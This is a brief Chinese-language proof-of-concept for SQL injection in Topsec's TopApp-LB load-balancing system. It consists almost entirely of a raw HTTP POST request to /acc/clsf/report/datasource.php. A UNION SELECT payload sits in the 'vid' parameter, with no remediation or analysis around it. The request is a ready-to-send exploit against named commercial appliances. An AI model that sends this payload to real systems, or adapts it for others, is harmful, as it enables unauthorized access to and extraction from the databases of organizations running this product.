## 天融信TopApp-LB 负载均衡系统sql注入

	POST /acc/clsf/report/datasource.php HTTP/1.1
	Host:
	Connection: close
	Accept: text/javascript, text/html, application/xml, text/xml, */*
	X-Prototype-Version: 1.6.0.3
	X-Requested-With: XMLHttpRequest
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (	KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
	Sec-Fetch-Site: same-origin
	Sec-Fetch-Mode: cors
	Sec-Fetch-Dest: empty
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.9
	Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 201
	 
	t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。 